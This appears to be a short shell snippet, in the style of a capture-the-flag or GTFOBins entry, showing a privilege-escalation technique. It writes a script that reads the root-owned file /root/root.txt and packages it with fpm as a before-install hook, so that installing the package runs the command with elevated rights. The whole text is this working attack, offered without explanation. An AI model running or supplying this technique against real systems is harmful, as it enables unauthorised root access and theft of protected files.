TF=$(mktemp -d)
echo 'cat /root/root.txt' > $TF/x.sh
fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
